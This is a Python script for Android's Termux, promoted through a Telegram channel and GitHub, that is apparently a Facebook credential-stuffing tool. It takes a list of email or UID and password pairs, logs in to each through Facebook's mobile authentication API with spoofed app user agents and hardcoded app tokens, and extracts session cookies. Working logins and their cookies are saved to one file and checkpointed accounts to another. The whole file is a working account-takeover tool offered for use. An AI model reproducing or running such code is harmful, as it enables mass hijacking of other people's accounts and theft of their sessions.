# -*- coding: utf-8 -*-
# Name    : COOKIE EXTRACTOR
# Auhtor  : HADI ANHAF AIMAN
# Create  : 6 January 2025 12:27 PM
# <--------------[MAIN]--------------> #
try:
    import os,re,sys,time
    import uuid,json,string
    import random,platform,bs4
    import subprocess,requests,io
    import base64,hashlib,pycurl,shutil
    import webbrowser,datetime,urllib,ssl
    
    from string import *
    from time import time
    from io import BytesIO
    from bs4 import BeautifulSoup
    from datetime import datetime
    from os import system,path,remove
    from urllib.request import urlopen
except (Exception,ModuleNotFoundError):
    print("Loading required module...")
    __import__("os").system("pip install requests bs4 pycurl > /dev/null")

"""
try:import bsecure
except (ImportError,ModuleNotFoundError):
    __import__("sys").exit("Unfortunately You Can't Run My Tool...")
"""

base_path = "/data/data/com.termux/files/"
if path.isfile(base_path+"home/.termux/colors.properties") is True:
    N = "\x1b[38;5;258m";R = "\x1b[38;5;196m";G = "\x1b[38;5;46m";B = "\x1b[38;5;45m";Y = "\x1b[38;5;154m";I = "\x1b[38;5;127m";S = "\x1b[38;5;81m";W = "\x1b[38;5;256m";P = "\x1b[38;5;203m"
else:
    N = "\x1b[90m";R = "\x1b[91m";G = "\x1b[92m";Y = "\x1b[93m";B = "\x1b[94m";I = "\x1b[95m";S = "\x1b[96m";W = "\x1b[97m";P = "\x1b[38;5;203m"

database = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
day = datetime.now().day
month = database[str(datetime.now().month)]
year = datetime.now().year

sys.stdout.write('\x1b]2; MR-CODE-143 \x07')
uID = hashlib.md5((platform.version()+str(os.getuid())+platform.platform()+os.getlogin()+platform.release()).replace(' ','').encode()).hexdigest().upper()

class cokiExtractor:
    def __init__(self):
        self.X = f" {W}[{G}+{W}]"
        self.linex = lambda:print(f"{Y}•{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Y}•")
        self.box = lambda Text:f" {W}[{G}{Text}{W}]"
        self.path = "/sdcard/MR-CODE-143"
        self.verion = "1.1"
        self.type = "FREE"
    
    def banner(self):
        if sys.platform.lower() == "win":system("cls")
        elif sys.platform.lower() == "linux":system("clear")
        else:exit()
        print(f"""
  {W} 8888888888 888888b.  Y88b   d88P 
  {G} 888        888  "88b  Y88b d88P  
  {W} 888        888  .88P   Y88o88P   
  {G} 8888888    8888888K.    Y888P    
  {W} 888        888  "Y88b   d888b    
  {G} 888        888    888  d88888b   
  {W} 888        888   d88P d88P Y88b  
  {G} 888        8888888P" d88P   Y88b 
{Y}•{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Y}•
 {W}[{G}+{W}] GITHUB  {R}-{G} MR-CODE-143
 {W}[{G}+{W}] VERSION  {R}-{G} {self.verion} {W}-> {B}{self.type}
 {W}[{G}+{W}] DEVELOPER {R}-{G} HADI ANHAF AIMAN
{Y}•{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Y}•""")
    
    def main(self):
        self.banner()
        print(f"{self.box('1')} START EXTRACTOR")
        print(f"{self.box('2')} JOIN TELEGRAM CHANNEL")
        print(f"{self.box('3')} FOLLOW GITHUB")
        print(f"{self.box('4')} EXIT <{R}/{W}>")
        self.linex()
        self.select = input(f"{self.X} SELECT  :-{G} ")
        if self.select == "1":self.detact_method()
        elif self.select == "2":system("xdg-open https://t.me/mr_code_143");self.main()
        elif self.select == "3":system("xdg-open https://github.com/MR-CODE-143");self.main()
        elif self.select == "4":print(f"{self.X} THANKS FOR USING MY TOOL");sys.exit(self.linex())
        else:self.main()
    
    def detact_method(self):
        self.banner()
        print(f"{self.box('1')} METHOD API (FAST)")
        print(f"{self.box('2')} METHOD API (SLOW)")
        self.linex()
        self.select = input(f"{self.X} SELECT  :-{G} ")
        if self.select == "1":ApiSystem(self).main(method=1)
        elif self.select == "2":ApiSystem(self).main(method=2)
        else:ApiSystem(self).main(method=1)

class ApiSystem:
    def __init__(self,orgin):
        self.X = orgin
        self.save = []
        self.loop = 0
        self.oks = []
        self.cps = []
        self.ers = []
    
    def ugenA(self):
        ua1 = "[FBAN/FB4A;FBAV/274.0.0.46.119;FBBV/219237478;FBDM/{density=3.0,width=1080,height=2192};FBLC/en_US;FBRV/220725958;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto z4;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua2 = "[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129387;FBDM/{density=4.5,width=1440,height=2744};FBLC/en_US;FBRV/227989218;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua3 = "[FBAN/FB4A;FBAV/278.0.0.51.119;FBBV/229281782;FBDM/{density=2.625,width=1080,height=2075};FBLC/en_US;FBRV/230624390;FBCR/Bite;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A6003;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
        ua4 = "[FBAN/FB4A;FBAV/264.0.0.44.111;FBBV/206636693;FBDM/{density=2.75,width=1080,height=1920};FBLC/en_US;FBRV/208541728;FBCR/Tsel-DiRumahAja;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        max = random.choice([ua1,ua2,ua3,ua4])
        return str(max)
    
    def ugenB(self):
        ua1 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=3.375,width=1080,height=2058};FBLC/en_US;FBRV/210561420;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G892A;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]"
        ua2 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629372;FBDM/{density=2.625,width=1080,height=2064};FBLC/en_US;FBRV/210658448;FBCR/Spectrum;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N970U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
        ua3 = "[FBAN/FB4A;FBAV/268.0.0.7.121;FBBV/210375804;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
        ua4 = "[FBAN/FB4A;FBAV/266.0.0.64.124;FBBV/209629374;FBDM/{density=4.0,width=1440,height=2768};FBLC/en_US;FBRV/210796532;FBCR/Republic;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960U1;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]"
        max = random.choice([ua1,ua2,ua3,ua4])
        return str(max)
    
    def main(self,method):
        self.X.banner()
        print(f"{self.X.X} YOUR FILE FORMAT ?")
        self.X.linex()
        print(f"{self.X.box('1')} UID|PASS")
        print(f"{self.X.box('2')} UID|PASS|COOKIE")
        print(f"{self.X.box('3')} EMAIL|PASS")
        print(f"{self.X.box('4')} EMAIL|PASS|COOKIE")
        self.X.linex()
        self.awm = input(f"{self.X.X} SELECT :-{G} ");self.X.linex()
        if self.awm == "1":self.mailpass(method)
        elif self.awm == "2":self.mailpasscokie(method)
        elif self.awm == "3":self.mailpass(method)
        elif self.awm == "4":self.mailpasscokie(method)
        else:self.main(method)
    
    def mailpass(self,method):
        self.X.banner()
        self.file = input(f"{self.X.X} FILE PATH :- ")
        try:self.files = open(self.file,"r").read().splitlines()
        except FileNotFoundError:self.mailpass(method)
        self.X.linex()
        print(f"{self.X.X} SAVE FILE FORMAT ?")
        self.X.linex()
        print(f"{self.X.box('1')} UID|PASS")
        print(f"{self.X.box('2')} UID|PASS|COOKIE")
        print(f"{self.X.box('3')} UID|EMAIL|PASS|COOKIE")
        self.X.linex()
        self.awm = input(f"{self.X.X} SELECT :-{G} ");self.X.linex()
        if self.awm == "1":self.save.append("A")
        elif self.awm == "2":self.save.append("B")
        elif self.awm == "3":self.save.append("C")
        self.X.banner()
        print(f"{self.X.X} TOTAL IDS :- {G}{str(len(self.files))}")
        print(f"{self.X.X} PROCCESS HAS BEEN STARTED....")
        self.X.linex()
        for users in self.files:
            email,password = users.split("|")
            if method == 1:self.apimethodA(email,password)
            elif method == 2:self.apimethodB(email,password)
            else:self.apimethodA(email,password)
        
        print("\n")
        self.X.linex()
        print(f"{self.X.X} TOTAL OKS :- {G}{str(len(self.oks))}")
        print(f"{self.X.X} TOTAL CPS :- {R}{str(len(self.cps))}")
        print(f"{self.X.X} TOTAL ERS :- {Y}{str(len(self.ers))}")
        sys.exit(self.X.linex())
    
    def mailpasscokie(self,method):
        self.X.banner()
        self.file = input(f"{self.X.X} FILE PATH :- ")
        try:self.files = open(self.file,"r").read().splitlines()
        except FileNotFoundError:self.mailpasscokie(method)
        self.X.linex()
        print(f"{self.X.X} SAVE FILE FORMAT ?")
        self.X.linex()
        print(f"{self.X.box('1')} UID|PASS")
        print(f"{self.X.box('2')} UID|PASS|COOKIE")
        print(f"{self.X.box('3')} UID|EMAIL|PASS|COOKIE")
        self.X.linex()
        self.awm = input(f"{self.X.X} SELECT :-{G} ");self.X.linex()
        if self.awm == "1":self.save.append("A")
        elif self.awm == "2":self.save.append("B")
        elif self.awm == "3":self.save.append("C")
        self.X.banner()
        print(f"{self.X.X} TOTAL IDS :- {G}{str(len(self.files))}")
        print(f"{self.X.X} PROCCESS HAS BEEN STARTED....")
        self.X.linex()
        for users in self.files:
            email,password,cookie = users.split("|")
            if method == 1:self.apimethodA(email,password)
            elif method == 2:self.apimethodB(email,password)
            else:self.apimethodA(email,password)
        
        print("\n")
        self.X.linex()
        print(f"{self.X.X} TOTAL OKS :- {G}{str(len(self.oks))}")
        print(f"{self.X.X} TOTAL CPS :- {R}{str(len(self.cps))}")
        print(f"{self.X.X} TOTAL ERS :- {Y}{str(len(self.ers))}")
        sys.exit(self.X.linex())
    
    def apimethodA(self,email,password):
        global loop,oks,cps
        sys.stdout.write(f"\r {W}[FBX-XD] {self.loop}|M1|OKS:-{G}{len(self.oks)}\r")
        sys.stdout.flush()
        try:
            with requests.Session() as session:
                data = {
                'adid':str(uuid.uuid4()),
                'email':email,
                'password':password,
                'cpl':'true',
                'credentials_type':'device_based_login_password',
                "source": "device_based_login",
                'error_detail_type':'button_with_disabled',
                'format':'json',
                'generate_session_cookies':'1',
                'generate_analytics_claim':'1',
                'generate_machine_id':'1',
                "family_device_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "locale":"en_US","client_country_code":"US",
                "device_id": str(uuid.uuid4()),
                "method": "auth.login",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                header = {
                'content-type':'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'x-fb-sim-hni':str(random.randint(20000,40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent':self.ugenA(),
                'x-fb-net-hni':str(random.randint(20000,40000)),
                'x-fb-device-group': '5120',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),
                'x-fb-connection-quality':'EXCELLENT',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'x-fb-friendly-name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'accept-encoding':'gzip, deflate',
                'x-fb-http-engine':'Liger'}
                sub_url = "https://graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
                response = session.post(sub_url,data=data,headers=header,allow_redirects=False,verify=True).json()
                if "access_token" in response:
                    uid = str(response["uid"])
                    lock_rm = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal").text
                    if "Photoshop" in lock_rm:
                        ckkk = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        cookie = f"sb={ssbb};{ckkk}"
                        if "A" in self.save:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}")
                            paths = "/sdcard/EXTRACT-M1-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+password+"\n")
                            self.oks.append(uid)
                        elif "B" in self.save:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}{W}|{G}{cookie}");self.X.linex()
                            paths = "/sdcard/EXTRACT-M1-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+password+"|"+cookie+"\n")
                            self.oks.append(uid)
                        elif "C" in self.save:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}{W}|{G}{cookie}");self.X.linex()
                            paths = "/sdcard/EXTRACT-M1-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+email+"|"+password+"|"+cookie+"\n")
                            self.oks.append(uid)
                        else:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}{W}|{G}{cookie}");self.X.linex()
                            paths = "/sdcard/EXTRACT-M1-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+password+"|"+cookie+"\n")
                            self.oks.append(uid)
                    else:self.ers.append(uid)
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/CP-IDS.txt","a").write(email+"|"+password+"\n")
                    self.cps.append(email)
                else:self.ers.append(email)
            self.loop += 1
        except Exception as e:
            pass

    def apimethodB(self,email,password):
        global loop,oks,cps
        sys.stdout.write(f"\r {W}[FBX-XD] {self.loop}|M2|OKS:-{G}{len(self.oks)}\r")
        sys.stdout.flush()
        try:
            with requests.Session() as session:
                data = {"adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": email,
                "password": password,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
                header = {
                'User-Agent': self.ugenB(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'unknown',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                response = session.post("https://graph.facebook.com/auth/login",data=data,headers=header,allow_redirects=False,verify=True).json()
                if "access_token" in response:
                    uid = str(response["uid"])
                    lock_rm = requests.get(f"https://graph.facebook.com/{uid}/picture?type=normal").text
                    if "Photoshop" in lock_rm:
                        ckkk = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        cookie = f"sb={ssbb};{ckkk}"
                        if "A" in self.save:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}")
                            paths = "/sdcard/EXTRACT-M2-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+password+"\n")
                            self.oks.append(uid)
                        elif "B" in self.save:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}{W}|{G}{cookie}");self.X.linex()
                            paths = "/sdcard/EXTRACT-M2-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+password+"|"+cookie+"\n")
                            self.oks.append(uid)
                        elif "C" in self.save:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}{W}|{G}{cookie}");self.X.linex()
                            paths = "/sdcard/EXTRACT-M2-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+email+"|"+password+"|"+cookie+"\n")
                            self.oks.append(uid)
                        else:
                            print(f"\r\r {G}[FBX-OK] {uid}{W}|{G}{password}{W}|{G}{cookie}");self.X.linex()
                            paths = "/sdcard/EXTRACT-M2-OK.txt"
                            with open(paths,"a") as saves:
                                saves.write(uid+"|"+password+"|"+cookie+"\n")
                            self.oks.append(uid)
                    else:self.ers.append(uid)
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/CP-IDS.txt","a").write(email+"|"+password+"\n")
                    self.cps.append(email)
                else:self.ers.append(email)
            self.loop += 1
        except Exception as e:
            pass
# <--------------[EXIT]--------------> #
if __name__ == '__main__':
    cokiExtractor().main()